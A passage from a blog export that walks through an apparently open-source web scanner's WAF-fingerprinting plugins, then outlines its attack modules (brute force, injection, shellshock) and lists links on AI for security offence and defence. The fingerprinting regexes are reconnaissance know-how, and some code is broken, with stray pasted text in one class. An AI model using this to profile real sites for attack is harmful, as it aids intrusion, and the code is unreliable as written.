#匹配headers中value值是否有BinarySec            _ = re.search(r&#39;BinarySec&#39;, item[1], re.I) is not None            #匹配headers中key值是否有x-binarysec-via或x-binarysec-nocahe            _ |= re.search(r&#39;x-binarysec-[via|nocahe]&#39;, item[0], re.I) is not None            if _:                return &quot;BinarySEC Web Application Firewall (BinarySEC)&quot;</code></pre><h4 id="blockdos"><a href="#blockdos" class="headerlink" title="blockdos"></a>blockdos</h4><p>原理：主要依靠header特别字段的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190226101853.png" alt=""></p><pre><code class="python">class Blockdos(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有BlockDos[\.net]*            _ = re.search(r&#39;BlockDos[\.net]*&#39;, item[1], re.I) is not None            if _:                return &quot;BlockDoS&quot;</code></pre><h4 id="chinacache"><a href="#chinacache" class="headerlink" title="chinacache"></a>chinacache</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Chinacache(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有Powered-By-ChinaCache            _ = re.search(r&#39;Powered-By-ChinaCache&#39;, item[0], re.I) is not None            if _:                return &quot;ChinaCache-CDN&quot;</code></pre><h4 id="ciscoacexml"><a href="#ciscoacexml" class="headerlink" title="ciscoacexml"></a>ciscoacexml</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Ciscoacexml(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有ACE XML Gateway            _ = re.search(r&#39;ACE XML Gateway&#39;, item[1], re.I) is not None            if _:                return &quot;Cisco ACE XML Gateway (Cisco Systems)&quot;</code></pre><h4 id="cloudflare"><a href="#cloudflare" class="headerlink" title="cloudflare"></a>cloudflare</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Cloudflare(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有cloudflare[-nginx]            _ = re.search(r&#39;cloudflare[-nginx]&#39;, item[1], re.I) is not None            #匹配headers中value值是否有__cfduid=            _ |= re.search(r&#39;__cfduid=&#39;, item[1], re.I) is not None            #匹配headers中key值是否有cf-ray            _ |= re.search(r&#39;cf-ray&#39;, item[0], re.I) is not None            if _:                return &quot;CloudFlare Web Application Firewall (CloudFlare)&quot;</code></pre><h4 id="cloudfront"><a href="#cloudfront" class="headerlink" title="cloudfront"></a>cloudfront</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Cloudfront(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有(cloudfront)            _ = re.search(r&#39;(cloudfront)&#39;, item[1], re.I) is not None            #匹配headers中key值是否有x-amz-cf-id            _ |= re.search(&#39;x-amz-cf-id&#39;, item[0], re.I) is not None            if _:                return &quot;CloudFront Web Application Firewall (Amazon)&quot;</code></pre><h4 id="dotdefender"><a href="#dotdefender" class="headerlink" title="dotdefender"></a>dotdefender</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Dotdefender(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有X-dotDefender-denied            _ = re.search(r&#39;X-dotDefender-denied&#39;, item[0], re.I) is not None            if _:                return &quot;dotDefender Web Application Firewall (Applicure Technologies)&quot;</code></pre><h4 id="edgecast"><a href="#edgecast" class="headerlink" title="edgecast"></a>edgecast</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Edgecast(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有ECDF            _ = re.search(r&#39;ECDF&#39;, item[1], re.I) is not None            if _:                return &quot;EdgeCast Web Application Firewall (Verizon)&quot;</code></pre><h4 id="fortiweb"><a href="#fortiweb" class="headerlink" title="fortiweb"></a>fortiweb</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Fortiweb(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有FORTIWAFSID=            _ = re.search(r&#39;FORTIWAFSID=&#39;, item[1], re.I) is not None            if _:                return &quot;FortiWeb Web Application Firewall (Fortinet)&quot;</code></pre><h4 id="hyperguard"><a href="#hyperguard" class="headerlink" title="hyperguard"></a>hyperguard</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Hyperguard(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有 开始位置+WODSESSION=            _ = re.search(r&#39;^WODSESSION=&#39;, item[1], re.I) is not None            if _:                return &quot;Hyperguard Web Application Firewall (art of defence)&quot;</code></pre><h4 id="incapsula"><a href="#incapsula" class="headerlink" title="incapsula"></a>incapsula</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Incapsula(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有 incap_ses或visid_incap或Incapsula            _ = re.search(r&#39;incap_ses|visid_incap|Incapsula&#39;, item[1], re.I) is not None            if _:                return &quot;Incapsula Web Application Firewall (Incapsula/Imperva)&quot;</code></pre><h4 id="isaserver"><a href="#isaserver" class="headerlink" title="isaserver"></a>isaserver</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Isaserver(FingerprintPlugin):    def process(self, headers, content):        try:            _ = False            #匹配content中是否有The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.            _ = re.search(                r&#39;The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.&#39;,                content, re.I) is not None            #匹配content中是否有The ISA Server denied the specified Uniform Resource Locator (URL)            _ |= re.search(r&#39;The ISA Server denied the specified Uniform Resource Locator (URL)&#39;, content,                           re.I) is not None            if _:                return &quot;ISA Server (Microsoft)&quot;        #若未检测到则抛出异常        except Exception as e:            print(&quot;IsaServer Problem &quot;, e)</code></pre><h4 id="kona"><a href="#kona" class="headerlink" title="kona"></a>kona</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Kona(FingerprintPlugin):    def process(self, headers, content):        _ = False       for item in headers.items():            #匹配headers中value值是否有AkamaiGHost或Kona            _ = re.search(r&#39;AkamaiGHost|Kona&#39;, item[1], re.I) is not None            if _:                return &quot;Kona Web Application Firewall (Akamai)&quot;</code></pre><h4 id="modsecurity"><a href="#modsecurity" class="headerlink" title="modsecurity"></a>modsecurity</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Modsecurity(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有d_Security或NOYB            _ = re.search(r&#39;Mod_Security|NOYB&#39;, item[1], re.I) is not None            if _:                return &quot;ModSecurity Web Application Firewall (Trustwave)&quot;</code></pre><h4 id="netcontinuum"><a href="#netcontinuum" class="headerlink" title="netcontinuum"></a>netcontinuum</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Netcontinuum(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有NCI__SessionId=            _ = re.search(r&#39;NCI__SessionId=&#39;, item[1], re.I) is not None            if _:                return &quot;NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)&quot;</code></pre><h4 id="paloalt"><a href="#paloalt" class="headerlink" title="paloalt"></a>paloalt</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Paloalto(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有MISS from PaloAlto            _ = re.search(r&#39;MISS from PaloAlto&#39;, item[1], re.I) is not None            if _:                return &quot;Palo Alto Firewall (Palo Alto Networks)&quot;</code></pre><h4 id="profense"><a href="#profense" class="headerlink" title="profense"></a>profense</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Profense(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有PLBSID=            _ = re.search(r&#39;PLBSID=&#39;, item[1], re.I) is not None            #匹配headers中value值是否有Profense            _ = re.search(r&#39;Profense&#39;, item[1], re.I) is not None            if _:                return &quot;Profense Web Application Firewall (Armorlogic)&quot;</code></pre><h4 id="radware"><a href="#radware" class="headerlink" title="radware"></a>radware</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Radware(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有X-SL-CompState            _ = re.search(r&#39;X-SL-CompState&#39;, item[0], re.I) is not None            if _:                return &quot;AppWall Web Application Firewall (Radware)&quot;</code></pre><h4 id="requestvalidationmode"><a href="#requestvalidationmode" class="headerlink" title="requestvalidationmode"></a>requestvalidationmode</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Requestvalidationmode(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有ASP.NET has detected data in the request that is potentially dangerous        _ = re.search(r&#39;ASP.NET has detected data in the request that is potentially dangerous&#39;, content,                      re.I) is not NoneRequest Validation has detected a potentially dangerous client input value        #匹配content中是否有Request Validation has detected a potentially dangerous client input value        _ |= re.search(r&#39;Request Validation has detected a potentially dangerous client input value&#39;, content,                       re.I) is not None        if _:            return &quot;ASP.NET RequestValidationMode (Microsoft)&quot;</code></pre><h4 id="safedog"><a href="#safedog" class="headerlink" title="safedog"></a>safedog</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Safedog(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有WAF/2.0            _ = re.search(r&#39;WAF/2\.0&#39;, item[1], re.I) is not None            #匹配headers中value值是否有Safedog            _ |= re.search(r&#39;Safedog&#39;, item[1], re.I) is not None            if _:                return &quot;Safedog Web Application Firewall (Safedog)&quot;</code></pre><h4 id="secureiis"><a href="#secureiis" class="headerlink" title="secureiis"></a>secureiis</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Secureiis(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有SecureIIS+开始字符&lt;+Web Server Protection        _ = re.search(r&#39;SecureIIS[^&lt;]+Web Server Protection&#39;, content, re.I) is not None        #匹配content中是否有http://www.eeye.com/SecureIIS/        _ |= re.search(r&#39;http://www.eeye.com/SecureIIS/&#39;, content, re.I) is not None        #匹配content中是否有?subject=[^&gt;]*SecureIIS Error        _ |= re.search(r&#39;\?subject=[^&gt;]*SecureIIS Error&#39;, content, re.I) is not None        if _:            return &quot;SecureIIS Web Server Security (BeyondTrust&quot;</code></pre><h4 id="sengnix"><a href="#sengnix" class="headerlink" title="sengnix"></a>sengnix</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Senginx(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有SENGINX-ROBOT-MITIGATION        _ = re.search(r&#39;SENGINX-ROBOT-MITIGATION&#39;, content, re.I) is not None        if _:            return &quot;SEnginx (Neusoft Corporation)&quot;</code></pre><h4 id="sitelock"><a href="#sitelock" class="headerlink" title="sitelock"></a>sitelock</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Sitelock(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有SiteLock Incident ID        _ = re.search(r&#39;SiteLock Incident ID&#39;, content, re.I) is not None        if _:            return &quot;TrueShield Web Application Firewall (SiteLock)&quot;</code></pre><h4 id="sonicwall"><a href="#sonicwall" class="headerlink" title="sonicwall"></a>sonicwall</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Sonicwall(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有This request is blocked by the SonicWALL        _ = re.search(r&#39;This request is blocked by the SonicWALL&#39;, content, re.I) is not None        #匹配content中是否有Web Site Blocked.+\bnsa_banner      \b匹配一个单词边界        _ |= re.search(r&#39;Web Site Blocked.+\bnsa_banner&#39;, content, re.I) is not None        if _:            return &quot;SonicWALL (Dell)&quot;</code></pre><h4 id="sucuri"><a href="#sucuri" class="headerlink" title="sucuri"></a>sucuri</h4><p> 原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Sucuri(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有Sucuri或Cloudproxy            _ = re.search(r&#39;Sucuri|Cloudproxy&#39;, item[1], re.I) is not None            #匹配headers中key值是否有X-Sucuri-ID            _ |= re.search(r&#39;X-Sucuri-ID&#39;, item[0], re.I) is not None            if _:                return &quot;CloudProxy WebSite Firewall (Sucuri)&quot;</code></pre><h4 id="trafficshield"><a href="#trafficshield" class="headerlink" title="trafficshield"></a>trafficshield</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Trafficshield(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有F5-TrafficShield            _ = re.search(r&#39;F5-TrafficShield&#39;, item[1], re.I) is not None            #或匹配到headers中value值是否有ASINFO=            _ |= re.search(r&#39;ASINFO=&#39;, item[1], re.I) is not None            if _:                return &quot;TrafficShield (F5 Networks)&quot;</code></pre><h4 id="varnish"><a href="#varnish" class="headerlink" title="varnish"></a>varnish</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Varnish(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有X-Varnish            _ = re.search(r&#39;X-Varnish&#39;, item[0], re.I) is not None            #匹配headers中value值是否有varnish*            _ |= re.search(r&#39;varnish*&#39;, item[1], re.I) is not None            if _:                return &quot;Varnish FireWall (OWASP)&quot;</code></pre><h4 id="wallarm"><a href="#wallarm" class="headerlink" title="wallarm"></a>wallarm</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Wallarm(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有nginx-wallarm            _ = re.search(r&#39;nginx-wallarm&#39;, item[1], re.I) is not None            if _:                return &quot;Wallarm Web Application Firewall (Wallarm)&quot;</code></pre><h4 id="webknight"><a href="#webknight" class="headerlink" title="webknight"></a>webknight</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Webknight(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有Webknight            _ = re.search(r&#39;Webknight&#39;, item[1], re.I) is not None            if _:                return &quot;WebKnight Application Firewall (AQTRONIX)&quot;</code></pre><h2 id="0x08-lib-modules-attacks"><a href="#0x08-lib-modules-attacks" class="headerlink" title="0x08  lib/modules/attacks"></a>0x08  lib/modules/attacks</h2><p>主要的攻击模块</p><pre><code>│   │   ├── attacks│   │   │   ├── bruteforce│   │   │   │   ├── admin.py│   │   │   │   ├── backdoor.py│   │   │   │   ├── bdir.py│   │   │   │   ├── bfile.py│   │   │   │   ├── dir.py│   │   │   │   ├── file.py│   │   │   │   ├── __init__.py│   │   │   │   └── log.py│   │   │   ├── __init__.py│   │   │   ├── injection│   │   │   │   ├── html.py│   │   │   │   ├── __init__.py│   │   │   │   ├── ldap.py│   │   │   │   ├── php.py│   │   │   │   ├── rfi.py│   │   │   │   ├── sql.py│   │   │   │   ├── xpath.py│   │   │   │   └── xss.py│   │   │   ├── other│   │   │   │   ├── allow_method.py│   │   │   │   ├── dav.py│   │   │   │   ├── htmlobject.py│   │   │   │   ├── __init__.py│   │   │   │   ├── listing.py│   │   │   │   ├── multipleindex.py│   │   │   │   ├── phpinfo.py│   │   │   │   ├── robots.py│   │   │   │   └── xst.py│   │   │   └── vulns│   │   │       ├── anonymous.py│   │   │       ├── crime.py│   │   │       ├── __init__.py│   │   │       ├── shellshock.py│   │   │       └── strutsshock.py</code></pre><h3 id="bruteforce"><a href="#bruteforce" class="headerlink" title="bruteforce"></a>bruteforce</h3><h4 id="admin-py"><a href="#admin-py" class="headerlink" title="admin.py"></a>admin.py</h4><p>代更</p><h4 id="backdoor-py"><a href="#backdoor-py" class="headerlink" title="backdoor.py"></a>backdoor.py</h4><h4 id="bdir-py"><a href="#bdir-py" class="headerlink" title="bdir.py"></a>bdir.py</h4><h4 id="bfile-py"><a href="#bfile-py" class="headerlink" title="bfile.py"></a>bfile.py</h4><h4 id="dir-py"><a href="#dir-py" class="headerlink" title="dir.py"></a>dir.py</h4><h4 id="file-py"><a href="#file-py" class="headerlink" title="file.py"></a>file.py</h4><h4 id="init-py-2"><a href="#init-py-2" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="log-py"><a href="#log-py" class="headerlink" title="log.py"></a>log.py</h4><h4 id="init-py-3"><a href="#init-py-3" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>注入类的漏洞检测</p><h4 id="html-py"><a href="#html-py" class="headerlink" title="html.py"></a>html.py</h4><p>检查HTML代码注入。思路即：在参数值中添加进html代码，然后检查返回的响应，直接用<code>search(payload,resq.text)</code> 来看能否检测到相应的模式，。若存在则保存<code>URL</code>、<code>DATA</code>、<code>PAYLOAD</code>,然后输出。</p><h4 id="init-py-4"><a href="#init-py-4" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="ldap-py"><a href="#ldap-py" class="headerlink" title="ldap.py"></a>ldap.py</h4><h4 id="php-py"><a href="#php-py" class="headerlink" title="php.py"></a>php.py</h4><h4 id="rfi-py"><a href="#rfi-py" class="headerlink" title="rfi.py"></a>rfi.py</h4><h4 id="sql-py"><a href="#sql-py" class="headerlink" title="sql.py"></a>sql.py</h4><h4 id="xpath-py"><a href="#xpath-py" class="headerlink" title="xpath.py"></a>xpath.py</h4><h4 id="xss-py"><a href="#xss-py" class="headerlink" title="xss.py"></a>xss.py</h4><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><h4 id="allow-method-py"><a href="#allow-method-py" class="headerlink" title="allow_method.py"></a>allow_method.py</h4><h4 id="dav-py"><a href="#dav-py" class="headerlink" title="dav.py"></a>dav.py</h4><h4 id="htmlobject-py"><a href="#htmlobject-py" class="headerlink" title="htmlobject.py"></a>htmlobject.py</h4><h4 id="init-py-5"><a href="#init-py-5" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="listing-py"><a href="#listing-py" class="headerlink" title="listing.py"></a>listing.py</h4><h4 id="multipleindex-py"><a href="#multipleindex-py" class="headerlink" title="multipleindex.py"></a>multipleindex.py</h4><h4 id="phpinfo-py"><a href="#phpinfo-py" class="headerlink" title="phpinfo.py"></a>phpinfo.py</h4><h4 id="robots-py"><a href="#robots-py" class="headerlink" title="robots.py"></a>robots.py</h4><h4 id="xst-py"><a href="#xst-py" class="headerlink" title="xst.py"></a>xst.py</h4><h3 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h3><h4 id="anonymous-py"><a href="#anonymous-py" class="headerlink" title="anonymous.py"></a>anonymous.py</h4><h4 id="crime-py"><a href="#crime-py" class="headerlink" title="crime.py"></a>crime.py</h4><h4 id="init-py-6"><a href="#init-py-6" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="shellshock-py"><a href="#shellshock-py" class="headerlink" title="shellshock.py"></a>shellshock.py</h4><h4 id="strutsshock-py"><a href="#strutsshock-py" class="headerlink" title="strutsshock.py"></a>strutsshock.py</h4>]]></content>
      
      
      <categories>
          
          <category> 源码阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AI-Security-Learning</title>
      <link href="/archis/eed6fa1/"/>
      <url>/archis/eed6fa1/</url>
      
        <content type="html"><![CDATA[<h1 id="AI-Security-Learning"><a href="#AI-Security-Learning" class="headerlink" title="AI-Security-Learning"></a>AI-Security-Learning</h1><p>自身学习的安全数据科学和ai安全算法的学习资料</p><p>项目地址： <a href="https://github.com/bigbroke/AI-Security-Learning" target="_blank" rel="external">https://github.com/bigbroke/AI-Security-Learning</a></p><p>最近更新日期为：2019/02/17</p><p>同步更新于： <a href="http://Bigbroke.com/archis/eed6fa1/">Bigbroke: AI-Security-Learning</a></p><p>[TOC]</p><h2 id="机器学习与安全课程"><a href="#机器学习与安全课程" class="headerlink" title="机器学习与安全课程"></a>机器学习与安全课程</h2><ul><li><a href="http://web.stanford.edu/class/cs259d/" target="_blank" rel="external">斯坦福CS259D</a></li><li><a href="https://github.com/albahnsen/ML_SecurityInformatics" target="_blank" rel="external">短期课程 - 安全信息学应用机器学习</a></li><li><a href="https://github.com/cylance/IntroductionToMachineLearningForSecurityPros" target="_blank" rel="external">我们的书“安全专业人工智能简介”的示例代码</a></li></ul><h2 id="AI应用攻击篇"><a href="#AI应用攻击篇" class="headerlink" title="AI应用攻击篇"></a>AI应用攻击篇</h2><p>用AI来做应用安全攻击</p><h3 id="自动化渗透"><a href="#自动化渗透" class="headerlink" title="自动化渗透"></a>自动化渗透</h3><ul><li><a href="https://securityonline.info/deep-exploit/" target="_blank" rel="external">Deep Exploit：使用机器学习的全自动渗透测试工具</a></li><li><a href="https://github.com/gyoisamurai/GyoiThon" target="_blank" rel="external">GyoiThon：使用机器学习的全自动渗透测试工具</a></li></ul><h3 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h3><ul><li><a href="https://paper.tuisec.win/detail/ccfdadb1b7e3f9e" target="_blank" rel="external">机器学习之识别简单验证码</a></li></ul><h3 id="自动化鱼叉式钓鱼攻击"><a href="#自动化鱼叉式钓鱼攻击" class="headerlink" title="自动化鱼叉式钓鱼攻击"></a>自动化鱼叉式钓鱼攻击</h3><ul><li><a href="https://www.freebuf.com/articles/web/132811.html" target="_blank" rel="external">一种基于机器学习的自动化鱼叉式网络钓鱼思路</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-Automated-E2E-Spear-Phishing-On-Twitter-wp.pdf" target="_blank" rel="external">Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter</a></li></ul><h3 id="自动化恶意软件样本生成"><a href="#自动化恶意软件样本生成" class="headerlink" title="自动化恶意软件样本生成"></a>自动化恶意软件样本生成</h3><ul><li><a href="https://arxiv.org/abs/1702.05983" target="_blank" rel="external">利用GAN生成对抗恶意软件样本</a></li></ul><h3 id="自动化漏洞挖掘"><a href="#自动化漏洞挖掘" class="headerlink" title="自动化漏洞挖掘"></a>自动化漏洞挖掘</h3><ul><li><a href="https://www.zybuluo.com/qinyun/note/957067" target="_blank" rel="external">AI与Android漏洞挖掘的那些事儿</a></li></ul><h3 id="通过舆情分析和精准广告投放来影响政治事件"><a href="#通过舆情分析和精准广告投放来影响政治事件" class="headerlink" title="通过舆情分析和精准广告投放来影响政治事件"></a>通过舆情分析和精准广告投放来影响政治事件</h3><ul><li><a href="https://www.zuozuovera.com/archives/1565/" target="_blank" rel="external">AI与安全的恩怨情仇五部曲「1」Misuse AI</a></li></ul><h2 id="AI应用防御篇"><a href="#AI应用防御篇" class="headerlink" title="AI应用防御篇"></a>AI应用防御篇</h2><p>用AI来做应用安全防护</p><h3 id="UEBA"><a href="#UEBA" class="headerlink" title="UEBA"></a>UEBA</h3><p><a href="https://ixyzero.com/blog/archives/4103.html" target="_blank" rel="external">UBA/UEBA的资料收集和学习</a></p><p><a href="https://www.secpulse.com/archives/95668.html" target="_blank" rel="external">UEBA架构设计之路1：UEBA框架</a>  </p><p><a href="https://www.secpulse.com/archives/96063.html" target="_blank" rel="external">UEBA架构设计之路2：数据接入和准备</a></p><p><a href="https://www.secpulse.com/archives/96049.html" target="_blank" rel="external">UEBA架构设计之路3：复杂事件处理引擎</a></p><p><a href="https://www.sec-un.org/ueba%E5%A6%82%E4%BD%95%E5%9C%A8%E4%BC%81%E4%B8%9A%E6%9C%89%E6%95%88%E5%9C%B0%E5%BA%94%E7%94%A8%E4%B8%8E%E8%90%BD%E5%9C%B0/" target="_blank" rel="external">UEBA如何在企业有效地应用与落地</a></p><p><a href="https://www.secrss.com/articles/760" target="_blank" rel="external">UEBA在企业安全领域应用的现状和挑战</a></p><p><a href="https://www.freebuf.com/articles/neopoints/131514.html" target="_blank" rel="external">浅析用户行为分析系统（UEBA）</a></p><p><a href="https://www.jianshu.com/p/b7eda54bb1e5" target="_blank" rel="external">机器学习算法在用户行为检测(UBA)领域</a></p><p><a href="https://www.jianshu.com/p/b7eda54bb1e5" target="_blank" rel="external">新一代数据安全的制胜法宝-UBA</a></p><p><a href="http://www.sohu.com/a/160849130_642762" target="_blank" rel="external">干货｜用机器学习检测异常点击流</a></p><p><a href="http://dearcharles.cn/2017/11/11/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E5%9C%A8%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B-UBA-%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="external">机器学习算法在用户行为检测(UBA)领域的应用</a></p><h3 id="Web安全检测"><a href="#Web安全检测" class="headerlink" title="Web安全检测"></a>Web安全检测</h3><h4 id="检测web攻击"><a href="#检测web攻击" class="headerlink" title="检测web攻击"></a>检测web攻击</h4><ul><li><a href="https://aivillage.org/posts/detecting-web-attacks-rnn/" target="_blank" rel="external">用递归神经网络检测WEB攻击</a></li><li><a href="https://iami.xyz/ML-IN-Webshell-Detection-Advantages-And-Disadvantages/" target="_blank" rel="external">Web安全检测中机器学习的经验之谈</a></li></ul><h4 id="Webshell检测"><a href="#Webshell检测" class="headerlink" title="Webshell检测"></a>Webshell检测</h4><ul><li><a href="https://www.s0nnet.com/archives/fshell-feature-1" target="_blank" rel="external">基于机器学习的分布式webshell检测系统-特征工程（1）</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNjEwNTQ4Mw==&amp;mid=2651577090&amp;idx=1&amp;sn=924b14ba842f57c34f06995416a98360&amp;chksm=8cd9c5e6bbae4cf0e3eed6192133c6c87de47cfcc911fca90d86f1383d5ec2f6f1cf661aaeb6&amp;mpshare=1&amp;scene=21&amp;srcid=0118yl2ryPVxJto00p3uvrhy#wechat_redirect" target="_blank" rel="external">兜哥基于机器学习的 Webshell 发现技术探索</a></li><li><a href="https://www.cdxy.me/?p=788" target="_blank" rel="external">深度学习PHP webshell查杀引擎demo</a></li><li><a href="https://github.com/lcatro/WebShell-Detect-By-Machine-Learning" target="_blank" rel="external">使用机器学习识别WebShell</a></li><li><a href="https://github.com/Lingerhk/fshell" target="_blank" rel="external">基于机器学习的分布式Webshell检测系统</a></li><li><a href="https://mp.weixin.qq.com/s/1V0xcjH-6V5qJoJILP0pJQ" target="_blank" rel="external">基于机器学习的Webshell发现技术探索</a></li><li><a href="http://gitbook.cn/books/5964d154cc597d3e0c08667c/index.html" target="_blank" rel="external">刘焱： Webshell 发现技术实战解析</a></li><li><a href="http://www.cnetsec.com/article/22593.html" target="_blank" rel="external">安普诺张涛：再谈webshell检测</a></li><li><a href="https://iami.xyz/New-Begin-For-Nothing/" target="_blank" rel="external">新开始:webshell的检测</a></li><li><a href="https://www.freebuf.com/articles/web/181169.html" target="_blank" rel="external">基于机器学习的WebShell检测方法与实现(上)</a></li><li><a href="https://paper.seebug.org/526/" target="_blank" rel="external">初探机器学习检测PHP Webshell</a></li></ul><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><ul><li><a href="https://www.cdxy.me/?p=773" target="_blank" rel="external">机器学习识别XSS实践</a></li><li><a href="http://webber.tech/posts/%E4%BD%BF%E7%94%A8%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A3%80%E6%B5%8BXSS/" target="_blank" rel="external">使用深度学习检测XSS</a></li><li><a href="http://webber.tech/posts/%E4%BD%BF%E7%94%A8%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A3%80%E6%B5%8BXSS%28%E7%BB%AD%29/" target="_blank" rel="external">使用深度学习检测XSS(续)</a></li></ul><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><ul><li><a href="https://manning23.github.io/2018/10/12/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%A7%84%E5%88%99%E5%AE%9E%E7%8E%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">利用机器学习和规则实现弱口令检测</a></li></ul><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><ul><li><a href="https://github.com/aviraonepiece/machine_learning" target="_blank" rel="external">基于KDDCUP 99数据集预测DDoS攻击</a></li><li><a href="http://wap.cnki.net/lunwen-1013353778.html" target="_blank" rel="external">基于谱分析与统计机器学习的DDoS攻击检测技术研究</a></li><li><a href="http://cdmd.cnki.com.cn/Article/CDMD-90002-2007140546.htm" target="_blank" rel="external">基于机器学习的分布式拒绝服务攻击检测方法研究</a></li><li><a href="https://pdfs.semanticscholar.org/6363/b9f28a7e037abe626a2e88fac3393c04bfda.pdfDefending" target="_blank" rel="external">DDoS Attacks Using Hidden Markov Models and Cooperative ReinforcementLearning*</a></li></ul><h3 id="恶意url检测"><a href="#恶意url检测" class="headerlink" title="恶意url检测"></a>恶意url检测</h3><ul><li><a href="https://arxiv.org/abs/1802.03162v2" target="_blank" rel="external">URLNet：通过深度学习学习URL表示以进行恶意URL检测</a></li><li><a href="http://www.freebuf.com/articles/network/131279.html" target="_blank" rel="external">用机器学习玩转恶意URL 检测</a></li><li><a 